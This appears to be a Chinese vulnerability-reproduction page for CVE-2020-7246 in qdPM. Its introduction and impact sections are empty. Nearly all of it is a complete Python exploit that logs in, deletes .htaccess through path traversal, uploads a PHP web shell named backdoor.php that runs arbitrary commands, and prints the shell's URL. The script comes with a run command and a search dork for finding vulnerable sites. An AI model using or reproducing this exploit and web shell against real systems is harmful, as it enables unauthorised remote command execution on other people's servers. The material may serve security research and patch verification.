<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-7246）QdPM &lt;9.1 远程代码执行漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><h2>三、复现过程</h2><p><strong>python CVE-2020-7246.py -url https://www.0-sec.org/ -u 用户名 -p密码</strong></p><p># Exploit Title: qdPM 9.1 - Remote Code Execution<br /># Google Dork: intitle:qdPM 9.1. Copyright © 2020 qdpm.net<br /># Date: 2020-01-22<br /># Exploit Author: Rishal Dwivedi (Loginsoft)<br /># Vendor Homepage: http://qdpm.net/<br /># Software Link: http://qdpm.net/download-qdpm-free-project-management<br /># Version: &lt;=1.9.1<br /># Tested on: Windows 10 (Python 2.7)<br /># CVE : CVE-2020-7246<br /># Exploit written in Python 2.7<br /># Tested Environment - Windows 10<br /># Path Traversal + Remote Code Execution<br /><br /># Command - qdpm-exploit.py -url http://localhost/ -u user@localhost.com -p password<br /># -*- coding: utf-8 -*-<br />#!/usr/bin/python<br /><br />import requests<br />from lxml import html<br />from argparse import ArgumentParser<br /><br />session_requests = requests.session()<br /><br />def multifrm(<br />    userid,<br />    username,<br />    csrftoken_,<br />    EMAIL,<br />    HOSTNAME,<br />    uservar,<br />    ):<br />    request_1 = {<br />        'sf_method': (None, 'put'),<br />        'users[id]': (None, userid[-1]),<br />        'users[photo_preview]': (None, uservar),<br />        'users[_csrf_token]': (None, csrftoken_[-1]),<br />        'users[name]': (None, username[-1]),<br />        'users[new_password]': (None, ''),<br />        'users[email]': (None, EMAIL),<br />        'extra_fields[9]': (None, ''),<br />        'users[remove_photo]': (None, '1'),<br />        }<br />    return request_1<br /><br /><br />def req(<br />    userid,<br />    username,<br />    csrftoken_,<br />    EMAIL,<br />    HOSTNAME,<br />    ):<br />    request_1 = multifrm(<br />        userid,<br />        username,<br />        csrftoken_,<br />        EMAIL,<br />        HOSTNAME,<br />        '.htaccess',<br />        )<br />    new = session_requests.post(HOSTNAME + 'index.php/myAccount/update'<br />                                , files=request_1)<br />    request_2 = multifrm(<br />        userid,<br />        username,<br />        csrftoken_,<br />        EMAIL,<br />        HOSTNAME,<br />        '../.htaccess',<br />        )<br />    new1 = session_requests.post(HOSTNAME + 'index.php/myAccount/update'<br />                                 , files=request_2)<br />    request_3 = {<br />        'sf_method': (None, 'put'),<br />        'users[id]': (None, userid[-1]),<br />        'users[photo_preview]': (None, ''),<br />        'users[_csrf_token]': (None, csrftoken_[-1]),<br />        'users[name]': (None, username[-1]),<br />        'users[new_password]': (None, ''),<br />        'users[email]': (None, EMAIL),<br />        'extra_fields[9]': (None, ''),<br />        'users[photo]': ('backdoor.php',<br />                         '&lt;?php if(isset($_REQUEST[\'cmd\'])){ echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; }?&gt;'<br />                         , 'application/octet-stream'),<br />        }<br />    upload_req = session_requests.post(HOSTNAME<br />            + 'index.php/myAccount/update', files=request_3)<br /><br /><br />def main(HOSTNAME, EMAIL, PASSWORD):<br />    result = session_requests.get(HOSTNAME + '/index.php/login')<br />    login_tree = html.fromstring(result.text)<br />    authenticity_token = \<br />        list(set(login_tree.xpath(&quot;//input[@name='login[_csrf_token]']/@value&quot;<br />             )))[0]<br />    payload = {'login[email]': EMAIL, 'login[password]': PASSWORD,<br />               'login[_csrf_token]': authenticity_token}<br />    result = session_requests.post(HOSTNAME + '/index.php/login',<br />                                   data=payload,<br />                                   headers=dict(referer=HOSTNAME<br />                                   + '/index.php/login'))<br />    account_page = session_requests.get(HOSTNAME + 'index.php/myAccount'<br />            )<br />    account_tree = html.fromstring(account_page.content)<br />    userid = account_tree.xpath(&quot;//input[@name='users[id]']/@value&quot;)<br />    username = account_tree.xpath(&quot;//input[@name='users[name]']/@value&quot;)<br />    csrftoken_ = \<br />        account_tree.xpath(&quot;//input[@name='users[_csrf_token]']/@value&quot;)<br />    req(userid, username, csrftoken_, EMAIL, HOSTNAME)<br />    get_file = session_requests.get(HOSTNAME + 'index.php/myAccount')<br />    final_tree = html.fromstring(get_file.content)<br />    backdoor = \<br />        final_tree.xpath(&quot;//input[@name='users[photo_preview]']/@value&quot;)<br />    print 'Backdoor uploaded at - &gt; ' + HOSTNAME + '/uploads/users/' \<br />        + backdoor[-1] + '?cmd=whoami'<br /><br /><br />if __name__ == '__main__':<br />    parser = \<br />        ArgumentParser(description='qdmp - Path traversal + RCE Exploit'<br />                       )<br />    parser.add_argument('-url', '--host', dest='hostname',<br />                        help='Project URL')<br />    parser.add_argument('-u', '--email', dest='email',<br />                        help='User email (Any privilege account)')<br />    parser.add_argument('-p', '--password', dest='password',<br />                        help='User password')<br />    args = parser.parse_args()<br /><br />    main(args.hostname, args.email, args.password)</p></body></html>